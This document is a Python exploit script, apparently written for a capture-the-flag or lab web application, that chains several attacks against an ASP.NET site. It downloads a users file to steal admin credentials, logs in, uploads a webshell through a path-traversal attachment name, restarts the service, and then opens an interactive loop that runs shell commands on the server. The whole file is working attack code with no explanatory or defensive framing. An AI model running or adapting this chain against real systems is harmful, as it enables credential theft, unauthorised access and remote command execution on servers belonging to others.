from rich.logging import RichHandler
from rich.console import Console
import logging
import requests
import sys
from urllib.parse import urlparse
import io
import zipfile
import time



REQ_VERIFY_TOKEN_PATTERN = '<input name="__RequestVerificationToken" type="hidden" value="'
WEBSHELL_NAME = "Foo"
RESTART_DELAY = 10

# 创建控制台对象
error_console = Console(stderr=True)

# 清除所有现有的处理器
logging.getLogger().handlers = []

# 配置日志
logging.basicConfig(
    level="INFO",
    format="%(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[RichHandler(console=error_console, rich_tracebacks=True, show_time=True)]
)
logger = logging.getLogger("rich")

def get_credentials(url):
    logger.warning(f"Trying to download username and password from {url}")

    user_csv_url = f"{url}/Download/Users.csv"
    
    response = requests.get(user_csv_url)
    if response.status_code == 200:
        logger.info(f"Downloaded {user_csv_url}")
    else:
        logger.error(f"Failed to download {url}")
        exit(1)
    
    zip_content = response.content
    # 使用 BytesIO 讀取 zip content
    zip_buffer = io.BytesIO(zip_content)
    
    # 解壓縮 zip 文件
    with zipfile.ZipFile(zip_buffer) as zip_file:
        logger.info("Extracting Users.csv")
        with zip_file.open('Users.csv') as csv_file:
            csv_content = csv_file.read().decode('utf-8')
            logger.info("Parsing Users.csv")
            username,password = csv_content.split('\n')[1].split(',')
            logger.critical(f"Username: {username}, Password: {password}")
    return username,password

def upload_webshell(url, session):
    logger.info("Uploading webshell")
    upload_url = f"{url}/Admin/Create"
    RequestVerificationToken = session.get(upload_url).text.split(REQ_VERIFY_TOKEN_PATTERN)[1].split('"')[0]

    data = {
        "Announcement.Title": "test",
        "Announcement.Content": "test",
        "Announcement.Author": "admin",
        "__RequestVerificationToken": RequestVerificationToken,
        "Announcement.IsTop": "false"
    }
    response = session.post(upload_url,data=data,files={'attachments': (f'../../Pages/{WEBSHELL_NAME}.cshtml',open('webshell.cshtml','r').read())})
    if response.status_code == 200 and response.url != upload_url:
        logger.critical("Uploaded webshell")
    else:
        logger.critical("Failed to upload webshell")
        exit(1)

def restart_service(url: str, session: requests.Session):
    logger.info("Restarting service...")
    restart_url = f"{url}/Admin/DebugSecretPage?handler=Restart"
    RequestVerificationToken = session.get(restart_url).text.split(REQ_VERIFY_TOKEN_PATTERN)[1].split('"')[0]
    data = {
        "__RequestVerificationToken": RequestVerificationToken
    }
    try:
        response = session.post(restart_url,data=data)
    except requests.exceptions.ConnectionError as e:
        logger.critical(f"Restart request sented")
    except Exception as e:
        logger.critical(f"Failed to send restart request: {e}")
        exit(1)
    for i in range(RESTART_DELAY):
        try:
            session.get(url,timeout=1)
            break
        except:
            logger.info(f"Waiting for service to restart... {RESTART_DELAY-i}")
            
    logger.critical("Service restarted")

def login(url,username,password):
    logger.info("Logging in...")
    session = requests.Session()
    login_url = f"{url}/Account/Login"
    RequestVerificationToken = session.get(login_url).text.split(REQ_VERIFY_TOKEN_PATTERN)[1].split('"')[0]
    logger.info(f"RequestVerificationToken: {RequestVerificationToken}")
    data = {
        "__RequestVerificationToken": RequestVerificationToken,
        "Username": username,
        "Password": password,
    }
    response = session.post(login_url,data=data)
    if response.status_code == 200 and response.url != login_url:
        logger.critical("Login successful")
        return session
    else:
        logger.critical("Login failed")
        exit(1)

def interactive_shell(webshell_url, session):
    logger.critical("Entering interactive shell...")
    while True:
        command = input("> ")
        response = session.get(f"{webshell_url}?cmd={command}")
        print(response.text.split("<!-- #region -->")[1].split("<!-- #endregion -->")[0])

def exploit(url):
    if urlparse(url).scheme == "":
        url = f"http://{url}"
    url = "http://" + urlparse(url).netloc
    
    username,password = get_credentials(url)
    session = login(url,username,password)
    upload_webshell(url, session)
    restart_service(url, session)
    webshell_url = f"{url}/{WEBSHELL_NAME}"
    logger.critical(f"Webshell URL: {webshell_url}")
    logger.critical("Exploit completed")
    interactive_shell(webshell_url, session)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        logger.critical("Usage: python exploit.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    logger.info(f"Exploiting {url}")
    exploit(url)
